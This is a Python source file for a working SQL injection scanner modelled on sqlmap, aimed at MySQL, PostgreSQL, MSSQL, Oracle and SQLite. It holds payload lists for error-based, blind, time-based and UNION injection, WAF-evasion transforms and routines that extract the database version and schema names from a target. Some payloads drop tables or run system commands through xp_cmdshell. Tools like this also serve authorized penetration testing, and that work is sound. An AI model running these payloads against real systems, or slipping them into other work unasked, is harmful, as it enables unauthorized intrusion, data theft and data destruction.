"""
SQL Injection Scanner — Inspired by sqlmap
Techniques: Error-based, Boolean-blind, Time-based blind, UNION-based
Supports: MySQL, PostgreSQL, MSSQL, Oracle, SQLite
WAF bypass: encoding, case variation, comment injection, whitespace substitution
"""

import re
import time
import urllib.parse
import urllib.request
import ssl
import socket
import concurrent.futures
from typing import List, Dict, Optional, Tuple
from colorama import Fore, Style

# ── SSL context ───────────────────────────────────────────────────────────────
def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


# ── HTTP helper ───────────────────────────────────────────────────────────────
def _http_get(url: str, timeout: float = 10.0,
              headers: Dict = None) -> Tuple[int, str, float]:
    """
    Send GET request. Returns (status, body, elapsed_seconds).
    """
    try:
        req = urllib.request.Request(url)
        req.add_header('User-Agent',
                       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                       'AppleWebKit/537.36 Chrome/120.0 Safari/537.36')
        req.add_header('Accept', 'text/html,*/*')
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)

        start = time.time()
        with urllib.request.urlopen(req, timeout=timeout,
                                    context=_ssl_ctx()) as resp:
            body = resp.read(65536).decode('utf-8', errors='replace')
            elapsed = time.time() - start
            return resp.status, body, elapsed
    except urllib.error.HTTPError as e:
        return e.code, '', time.time() - (time.time() - 0.1)
    except Exception:
        return -1, '', 0.0


def _http_post(url: str, data: Dict, timeout: float = 10.0) -> Tuple[int, str, float]:
    """Send POST request."""
    try:
        body = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(url, data=body, method='POST')
        req.add_header('User-Agent',
                       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                       'AppleWebKit/537.36 Chrome/120.0 Safari/537.36')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        req.add_header('Accept', 'text/html,*/*')

        start = time.time()
        with urllib.request.urlopen(req, timeout=timeout,
                                    context=_ssl_ctx()) as resp:
            body_r = resp.read(65536).decode('utf-8', errors='replace')
            elapsed = time.time() - start
            return resp.status, body_r, elapsed
    except urllib.error.HTTPError as e:
        return e.code, '', 0.0
    except Exception:
        return -1, '', 0.0


# ── Payload libraries ─────────────────────────────────────────────────────────

# Error-based payloads — trigger DB error messages
ERROR_PAYLOADS = [
    # MySQL
    "'",
    "''",
    "`",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    # PostgreSQL
    "' AND 1=CAST((SELECT version()) AS INT)--",
    "'; SELECT pg_sleep(0)--",
    # MSSQL
    "' AND 1=CONVERT(INT,(SELECT @@VERSION))--",
    "'; EXEC xp_cmdshell('whoami')--",
    # Oracle
    "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
    # Generic
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1; SELECT 1",
    "1; DROP TABLE users--",
]

# Error signatures by DBMS
DB_ERROR_PATTERNS = {
    'MySQL': [
        r'you have an error in your sql syntax',
        r'warning: mysql',
        r'mysql_fetch',
        r'mysql_num_rows',
        r'supplied argument is not a valid mysql',
        r'column count doesn\'t match',
        r'unknown column',
        r'table .* doesn\'t exist',
        r'extractvalue\(',
        r'updatexml\(',
    ],
    'PostgreSQL': [
        r'pg_query\(\)',
        r'pg_exec\(\)',
        r'postgresql.*error',
        r'warning.*pg_',
        r'valid postgresql result',
        r'npgsql\.',
        r'pgsql',
        r'syntax error at or near',
        r'unterminated quoted string',
    ],
    'MSSQL': [
        r'driver.*sql.*server',
        r'ole db.*sql server',
        r'sql server.*driver',
        r'warning.*mssql',
        r'microsoft sql native client',
        r'odbc sql server driver',
        r'\[sql server\]',
        r'unclosed quotation mark',
        r'incorrect syntax near',
    ],
    'Oracle': [
        r'oracle.*driver',
        r'warning.*oci_',
        r'quoted string not properly terminated',
        r'ora-\d{5}',
        r'oracle error',
        r'oracle.*exception',
    ],
    'SQLite': [
        r'sqlite_',
        r'sqlite3::',
        r'sqlite error',
        r'unrecognized token',
        r'near ".*": syntax error',
    ],
    'Generic': [
        r'sql syntax',
        r'syntax error',
        r'sql error',
        r'database error',
        r'query failed',
        r'invalid query',
        r'sql command',
        r'unclosed quotation',
        r'unterminated string',
    ],
}

# Boolean-based blind payloads — TRUE vs FALSE comparison
BOOLEAN_PAYLOADS = [
    # (true_payload, false_payload)
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("' AND 1=1#", "' AND 1=2#"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND 1=1--", "1' AND 1=2--"),
    ("' OR '1'='1'--", "' OR '1'='2'--"),
    ("1 AND (SELECT 1)=1", "1 AND (SELECT 1)=2"),
    ("' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
     "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='z'--"),
]

# Time-based blind payloads — cause deliberate delay
TIME_PAYLOADS = [
    # MySQL
    "' AND SLEEP(3)--",
    "' AND SLEEP(3)#",
    "1 AND SLEEP(3)--",
    "'; SELECT SLEEP(3)--",
    "1' AND SLEEP(3) AND '1'='1",
    # PostgreSQL
    "'; SELECT pg_sleep(3)--",
    "' AND 1=(SELECT 1 FROM pg_sleep(3))--",
    # MSSQL
    "'; WAITFOR DELAY '0:0:3'--",
    "1; WAITFOR DELAY '0:0:3'--",
    # Oracle
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
    # Generic
    "' OR SLEEP(3)--",
    "' OR pg_sleep(3)--",
]

# UNION-based payloads — extract data via UNION SELECT
UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    # With version extraction
    "' UNION SELECT @@version--",
    "' UNION SELECT version()--",
    "' UNION SELECT NULL,@@version--",
    "' UNION SELECT NULL,version()--",
    "' UNION SELECT NULL,NULL,@@version--",
]

# WAF bypass variants — applied to any payload
WAF_BYPASS_TRANSFORMS = [
    lambda p: p,                                          # original
    lambda p: p.replace(' ', '/**/'),                    # comment spaces
    lambda p: p.replace(' ', '%20'),                     # URL encode spaces
    lambda p: p.replace(' ', '+'),                       # plus spaces
    lambda p: p.upper(),                                  # uppercase
    lambda p: p.replace('SELECT', 'SeLeCt'),             # mixed case
    lambda p: p.replace('AND', 'AnD').replace('OR', 'Or'),
    lambda p: p.replace('UNION', 'UNiOn'),
    lambda p: p.replace('SLEEP', 'SlEeP'),
    lambda p: urllib.parse.quote(p),                     # full URL encode
    lambda p: p.replace("'", "%27"),                     # encode quote
    lambda p: p.replace(' ', '\t'),                      # tab spaces
    lambda p: p.replace(' ', '\n'),                      # newline spaces
    lambda p: p + '-- -',                                # alternate comment
    lambda p: p.replace('--', '#'),                      # hash comment
]


# ── Parameter extraction ──────────────────────────────────────────────────────

def extract_params(url: str) -> Dict[str, str]:
    """Extract GET parameters from a URL."""
    parsed = urllib.parse.urlparse(url)
    return dict(urllib.parse.parse_qsl(parsed.query))


def inject_param(url: str, param: str, payload: str) -> str:
    """Replace a parameter value with a payload."""
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    params[param] = payload
    new_query = urllib.parse.urlencode(params)
    return urllib.parse.urlunparse(
        (parsed.scheme, parsed.netloc, parsed.path,
         parsed.params, new_query, parsed.fragment)
    )


def get_base_url(url: str) -> str:
    """Get URL without query string."""
    parsed = urllib.parse.urlparse(url)
    return urllib.parse.urlunparse(
        (parsed.scheme, parsed.netloc, parsed.path, '', '', ''))


# ── Detection engines ─────────────────────────────────────────────────────────

def _detect_error_based(url: str, param: str,
                        baseline_body: str,
                        timeout: float) -> Optional[Dict]:
    """Test for error-based SQL injection."""
    for payload in ERROR_PAYLOADS:
        for transform in WAF_BYPASS_TRANSFORMS[:5]:  # first 5 transforms
            injected = transform(payload)
            test_url = inject_param(url, param, injected)
            status, body, _ = _http_get(test_url, timeout)

            if status == -1:
                continue

            body_lower = body.lower()
            for dbms, patterns in DB_ERROR_PATTERNS.items():
                for pattern in patterns:
                    if re.search(pattern, body_lower, re.IGNORECASE):
                        return {
                            'technique': 'Error-based',
                            'dbms':      dbms,
                            'param':     param,
                            'payload':   injected,
                            'evidence':  re.search(pattern, body_lower,
                                                   re.IGNORECASE).group(0)[:80],
                        }
    return None


def _detect_boolean_blind(url: str, param: str,
                          baseline_body: str,
                          timeout: float) -> Optional[Dict]:
    """Test for boolean-based blind SQL injection."""
    baseline_len = len(baseline_body)

    for true_p, false_p in BOOLEAN_PAYLOADS:
        for transform in WAF_BYPASS_TRANSFORMS[:4]:
            t_payload = transform(true_p)
            f_payload = transform(false_p)

            t_url = inject_param(url, param, t_payload)
            f_url = inject_param(url, param, f_payload)

            _, t_body, _ = _http_get(t_url, timeout)
            _, f_body, _ = _http_get(f_url, timeout)

            if not t_body or not f_body:
                continue

            t_len = len(t_body)
            f_len = len(f_body)

            # Significant difference between TRUE and FALSE responses
            diff = abs(t_len - f_len)
            if diff > 50:
                # TRUE response should be closer to baseline
                t_diff = abs(t_len - baseline_len)
                f_diff = abs(f_len - baseline_len)

                if t_diff < f_diff:
                    return {
                        'technique': 'Boolean-based Blind',
                        'dbms':      'Unknown',
                        'param':     param,
                        'payload':   t_payload,
                        'evidence':  (f'TRUE response: {t_len} bytes, '
                                      f'FALSE response: {f_len} bytes '
                                      f'(diff: {diff})'),
                    }
    return None


def _detect_time_based(url: str, param: str,
                       baseline_time: float,
                       timeout: float) -> Optional[Dict]:
    """Test for time-based blind SQL injection."""
    SLEEP_SECONDS = 3
    THRESHOLD     = 2.5  # must be at least this much slower

    for payload in TIME_PAYLOADS:
        for transform in WAF_BYPASS_TRANSFORMS[:3]:
            injected = transform(payload)
            test_url = inject_param(url, param, injected)

            _, _, elapsed = _http_get(test_url, timeout + SLEEP_SECONDS + 2)

            if elapsed >= (baseline_time + THRESHOLD):
                # Determine DBMS from payload
                dbms = 'MySQL'
                if 'pg_sleep' in payload.lower():
                    dbms = 'PostgreSQL'
                elif 'waitfor' in payload.lower():
                    dbms = 'MSSQL'
                elif 'dbms_pipe' in payload.lower():
                    dbms = 'Oracle'

                return {
                    'technique': 'Time-based Blind',
                    'dbms':      dbms,
                    'param':     param,
                    'payload':   injected,
                    'evidence':  (f'Response took {elapsed:.2f}s '
                                  f'(baseline: {baseline_time:.2f}s, '
                                  f'delay: {elapsed - baseline_time:.2f}s)'),
                }
    return None


def _detect_union_based(url: str, param: str,
                        baseline_body: str,
                        timeout: float) -> Optional[Dict]:
    """Test for UNION-based SQL injection."""
    for payload in UNION_PAYLOADS:
        for transform in WAF_BYPASS_TRANSFORMS[:4]:
            injected = transform(payload)
            test_url = inject_param(url, param, injected)
            _, body, _ = _http_get(test_url, timeout)

            if not body:
                continue

            # Look for version strings or NULL markers in response
            if re.search(r'\d+\.\d+\.\d+', body):
                # Check if it's a version string not in baseline
                if not re.search(r'\d+\.\d+\.\d+', baseline_body):
                    return {
                        'technique': 'UNION-based',
                        'dbms':      'Unknown',
                        'param':     param,
                        'payload':   injected,
                        'evidence':  'Version string extracted via UNION',
                    }

            # Significant body length change
            if abs(len(body) - len(baseline_body)) > 100:
                body_lower = body.lower()
                for dbms, patterns in DB_ERROR_PATTERNS.items():
                    for pattern in patterns:
                        if re.search(pattern, body_lower):
                            return {
                                'technique': 'UNION-based',
                                'dbms':      dbms,
                                'param':     param,
                                'payload':   injected,
                                'evidence':  f'DB error in UNION response',
                            }
    return None


# ── Data extraction ───────────────────────────────────────────────────────────

def _extract_version(url: str, param: str,
                     dbms: str, timeout: float) -> str:
    """Try to extract database version."""
    version_payloads = {
        'MySQL':      "' UNION SELECT @@version-- ",
        'PostgreSQL': "' UNION SELECT version()-- ",
        'MSSQL':      "' UNION SELECT @@version-- ",
        'Oracle':     "' UNION SELECT banner FROM v$version WHERE ROWNUM=1-- ",
        'SQLite':     "' UNION SELECT sqlite_version()-- ",
        'Unknown':    "' UNION SELECT @@version-- ",
    }

    payload = version_payloads.get(dbms, version_payloads['Unknown'])
    for transform in WAF_BYPASS_TRANSFORMS[:3]:
        injected = transform(payload)
        test_url = inject_param(url, param, injected)
        _, body, _ = _http_get(test_url, timeout)

        # Look for version pattern
        m = re.search(r'(\d+\.\d+[\.\d\w\-]+)', body)
        if m:
            return m.group(1)

    return 'Could not extract'


def _extract_databases(url: str, param: str,
                       dbms: str, timeout: float) -> List[str]:
    """Try to extract database names."""
    db_payloads = {
        'MySQL':      "' UNION SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata-- ",
        'PostgreSQL': "' UNION SELECT string_agg(datname,',') FROM pg_database-- ",
        'MSSQL':      "' UNION SELECT name FROM master..sysdatabases-- ",
        'Oracle':     "' UNION SELECT LISTAGG(username,',') FROM all_users-- ",
    }

    payload = db_payloads.get(dbms, db_payloads.get('MySQL', ''))
    if not payload:
        return []

    for transform in WAF_BYPASS_TRANSFORMS[:3]:
        injected = transform(payload)
        test_url = inject_param(url, param, injected)
        _, body, _ = _http_get(test_url, timeout)

        # Look for comma-separated database names
        m = re.search(r'([a-zA-Z_][a-zA-Z0-9_,]+)', body)
        if m and ',' in m.group(1):
            return [d.strip() for d in m.group(1).split(',') if d.strip()]

    return []


# ── Main scanner ──────────────────────────────────────────────────────────────

class SQLiScanner:
    def __init__(self, timeout: float = 10.0, threads: int = 4,
                 verbose: bool = False, extract_data: bool = False):
        self.timeout      = timeout
        self.threads      = threads
        self.verbose      = verbose
        self.extract_data = extract_data

    def scan(self, url: str, method: str = 'GET',
             post_data: Dict = None,
             custom_params: List[str] = None) -> Dict:
        """
        Scan a URL for SQL injection vulnerabilities.
        Returns a results dict with all findings.
        """
        results = {
            'url':          url,
            'method':       method.upper(),
            'vulnerable':   False,
            'findings':     [],
            'params_tested': [],
            'dbms':         None,
            'version':      None,
            'databases':    [],
        }

        # Extract parameters to test
        params = extract_params(url)
        if custom_params:
            params = {k: v for k, v in params.items()
                      if k in custom_params}

        if not params:
            results['error'] = ('No GET parameters found in URL. '
                                'Add ?param=value to the URL.')
            return results

        results['params_tested'] = list(params.keys())

        print(f"\n  {Fore.CYAN}[*]{Style.RESET_ALL} Testing {len(params)} "
              f"parameter(s): {Fore.YELLOW}"
              f"{', '.join(params.keys())}{Style.RESET_ALL}")

        for param in params:
            if self.verbose:
                print(f"\n  {Fore.CYAN}[*]{Style.RESET_ALL} "
                      f"Testing parameter: {Fore.YELLOW}{param}{Style.RESET_ALL}")

            # Get baseline response
            _, baseline_body, baseline_time = _http_get(url, self.timeout)
            if not baseline_body:
                print(f"  {Fore.RED}[!]{Style.RESET_ALL} "
                      f"Could not reach target URL")
                continue

            # Run all detection techniques
            techniques = [
                ('Error-based',       _detect_error_based,
                 (url, param, baseline_body, self.timeout)),
                ('Boolean-blind',     _detect_boolean_blind,
                 (url, param, baseline_body, self.timeout)),
                ('Time-based blind',  _detect_time_based,
                 (url, param, baseline_time, self.timeout)),
                ('UNION-based',       _detect_union_based,
                 (url, param, baseline_body, self.timeout)),
            ]

            for tech_name, detector, args in techniques:
                if self.verbose:
                    print(f"  {Fore.CYAN}  [>]{Style.RESET_ALL} "
                          f"Testing {tech_name}...", end='', flush=True)

                finding = detector(*args)

                if finding:
                    results['vulnerable'] = True
                    results['findings'].append(finding)

                    if not results['dbms'] or results['dbms'] == 'Unknown':
                        results['dbms'] = finding.get('dbms', 'Unknown')

                    if self.verbose:
                        print(f" {Fore.GREEN}VULNERABLE!{Style.RESET_ALL}")
                    else:
                        print(f"\n  {Fore.GREEN}[+] VULNERABLE!{Style.RESET_ALL} "
                              f"Param: {Fore.YELLOW}{param}{Style.RESET_ALL}  "
                              f"Technique: {Fore.RED}{finding['technique']}{Style.RESET_ALL}  "
                              f"DBMS: {Fore.CYAN}{finding.get('dbms','?')}{Style.RESET_ALL}")

                    # Try to extract data if requested
                    if self.extract_data and results['dbms']:
                        print(f"  {Fore.CYAN}[*]{Style.RESET_ALL} "
                              f"Extracting database info...")
                        results['version'] = _extract_version(
                            url, param, results['dbms'], self.timeout)
                        results['databases'] = _extract_databases(
                            url, param, results['dbms'], self.timeout)

                    break  # Found vuln in this param, move to next

                elif self.verbose:
                    print(f" {Fore.RED}not vulnerable{Style.RESET_ALL}")

        return results


# ── Pretty printer ────────────────────────────────────────────────────────────

def print_sqli_results(results: Dict):
    """Print SQL injection scan results."""
    R  = Fore.RED
    G  = Fore.GREEN
    W  = Fore.WHITE
    Y  = Fore.YELLOW
    C  = Fore.CYAN
    D  = Style.DIM + Fore.WHITE
    RS = Style.RESET_ALL
    B  = Style.BRIGHT

    sep = '=' * 70
    print(f"\n{R}{sep}{RS}")
    print(f"  {R}{B}SQL INJECTION SCAN RESULTS{RS}")
    print(f"{R}{sep}{RS}")
    print(f"  Target  : {C}{results['url']}{RS}")
    print(f"  Method  : {W}{results['method']}{RS}")
    print(f"  Params  : {Y}{', '.join(results.get('params_tested', []))}{RS}")
    print(f"  Status  : ", end='')

    if results['vulnerable']:
        print(f"{G}{B}VULNERABLE{RS}")
    else:
        print(f"{G}Not vulnerable (or not detected){RS}")

    if results.get('error'):
        print(f"  Error   : {R}{results['error']}{RS}")

    if results['findings']:
        print(f"\n  {R}{'─' * 66}{RS}")
        print(f"  {W}{B}FINDINGS:{RS}")
        print(f"  {R}{'─' * 66}{RS}")

        for i, f in enumerate(results['findings'], 1):
            print(f"\n  {R}[{i}]{RS} {W}{B}{f['technique']}{RS}")
            print(f"      Parameter : {Y}{f['param']}{RS}")
            print(f"      DBMS      : {C}{f.get('dbms', 'Unknown')}{RS}")
            print(f"      Payload   : {R}{f['payload'][:80]}{RS}")
            print(f"      Evidence  : {D}{f.get('evidence', '')[:80]}{RS}")

    if results.get('version'):
        print(f"\n  {C}[DB]{RS} Version   : {W}{results['version']}{RS}")

    if results.get('databases'):
        print(f"  {C}[DB]{RS} Databases : {W}"
              f"{', '.join(results['databases'])}{RS}")

    print(f"\n{R}{sep}{RS}")

    if results['vulnerable']:
        print(f"\n  {R}{B}[!] WARNING:{RS} {W}SQL injection detected.{RS}")
        print(f"  {D}This system is vulnerable to database attacks.{RS}")
        print(f"  {D}Report this to the system owner immediately.{RS}")
    print()
